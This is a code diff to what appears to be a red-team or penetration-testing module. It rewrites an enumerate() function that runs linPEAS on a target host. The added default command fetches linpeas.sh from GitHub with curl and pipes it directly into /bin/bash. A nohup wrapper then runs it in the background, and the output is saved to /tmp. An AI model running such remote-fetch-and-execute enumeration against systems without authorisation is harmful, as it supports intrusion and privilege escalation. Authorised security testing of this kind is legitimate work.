@@ -94,10 +94,38 @@ class Module(BaseModule):
                 prep_local_env(csp=csp, task_name=task_name)
                 session.log("prep_local_env complete")
 
-            def enumerate():
+            def enumerate(command="curl -L https://github.com/peass-ng/PEASS-ng/releases/download/20240414-ed0a5fac/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files | tee /tmp/linpeas.txt"):
+                payload = f"""
+COMMAND="{command}"
+
+# Start the long-running command using nohup in the background
+nohup /bin/bash -c "$COMMAND" >/dev/null 2>&1 &
+
+# Store the Process ID of the background command
+PID=$!
+
+# Monitoring loop to check if the process is still running
+while kill -0 $PID 2>/dev/null; do
+    echo "Process $PID is still running..."
+    sleep 10
+done
+
+# Wait for the process to finish and capture its exit status
+wait $PID
+EXIT_STATUS=$?
+
+# Check the exit status of the process
+if [ $EXIT_STATUS -ne 0 ]; then
+    echo "Process $PID has finished with an error."
+    exit $EXIT_STATUS
+else
+    echo "Process $PID has completed successfully."
+fi
+
+exit 0
+"""
                 # run host enumeration
                 try:
-                    payload = 'timeout --signal=9 25m /bin/bash -c "curl -L https://github.com/peass-ng/PEASS-ng/releases/download/20240414-ed0a5fac/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files | tee /tmp/linpeas.txt" || true'
                     session.log("payload loaded and ready")
                     result = run_base64_payload(
                         session=session, payload=payload, log_name="payload_linpeas", timeout=1800)
